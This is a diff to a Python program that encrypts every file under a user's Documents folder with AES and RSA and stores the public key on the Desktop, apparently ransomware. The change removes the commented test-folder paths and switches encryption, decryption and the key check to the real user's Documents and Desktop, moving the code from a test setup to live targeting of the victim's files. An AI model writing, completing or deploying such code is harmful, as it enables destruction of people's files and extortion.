@@ -23,8 +23,8 @@ import socket
 # Constants
 BLOCK_SIZE = 32  # Bytes
 USERNAME = os.getlogin()  # Fetch USERNAME
-test_folder_path = "C:\\Users\\lenovo\\Downloads\\Documents"
-public_key_test_path = "C:\\Users\\lenovo\\Downloads\\Public_Keys"
+# test_folder_path = "C:\\Users\\lenovo\\Downloads\\Documents"
+# public_key_test_path = "C:\\Users\\lenovo\\Downloads\\Public_Keys"
 
 
 # Encryption / Decryption Helper Functions
@@ -73,8 +73,8 @@ def encrypt_rsa(a_message, key):
 # Encrypting / Decrypting Files
 def encrypt_files(aes_key):
     print("Encrypted Files:")
-    # directory = os.fsencode(f'C:\\Users\\{USERNAME}\\Documents')
-    directory = os.fsencode(test_folder_path)
+    directory = os.fsencode(f'C:\\Users\\{USERNAME}\\Documents')
+    # directory = os.fsencode(test_folder_path)
     _encrypt_files(aes_key, directory)
 
 
@@ -93,8 +93,8 @@ def _encrypt_files(aes_key, root_directory):
 
 def decrypt_files(aes_key):
     print("Decrypted Files:")
-    # directory = os.fsencode(f'C:\\Users\\{USERNAME}\\Documents')
-    directory = os.fsencode(test_folder_path)
+    directory = os.fsencode(f'C:\\Users\\{USERNAME}\\Documents')
+    # directory = os.fsencode(test_folder_path)
     _decrypt_files(aes_key, directory)
 
 
@@ -113,9 +113,9 @@ def _decrypt_files(aes_key, root_directory):
 
 # Saving / Loading Public Key
 def store_public_key_on_desktop(public_key):
-    # file = open(
-    #     f'C:\\Users\\{USERNAME}\\Desktop\\PublicKey.key', 'w')
-    file = open(public_key_test_path + '\\PublicKey.key', 'w')
+    file = open(
+        f'C:\\Users\\{USERNAME}\\Desktop\\PublicKey.key', 'w')
+    # file = open(public_key_test_path + '\\PublicKey.key', 'w')
     public_key_bytes = public_key.export_key('PEM')
     public_key_str = public_key_bytes.decode("latin-1")
     file.write(public_key_str)
@@ -123,9 +123,9 @@ def store_public_key_on_desktop(public_key):
 
 
 def read_public_key_from_desktop():
-    # file = open(
-    #     f'C:\\Users\\{USERNAME}\\Desktop\\PublicKey.key', 'r')
-    file = open(public_key_test_path + '\\PublicKey.key', 'r')
+    file = open(
+        f'C:\\Users\\{USERNAME}\\Desktop\\PublicKey.key', 'r')
+    # file = open(public_key_test_path + '\\PublicKey.key', 'r')
     public_key_str = file.read()
     public_key_bytes = public_key_str.encode("latin-1")
     key = RSA.import_key(public_key_bytes)
@@ -280,7 +280,7 @@ def encryptor():
 
 
 if __name__ == "__main__":
-    if not os.path.exists(public_key_test_path + '\\PublicKey.key'):
+    if not os.path.exists(f'C:\\Users\\{USERNAME}\\Desktop\\PublicKey.key'):
         # First run: Encryption
         encryption_complete = encryptor()
         if encryption_complete:
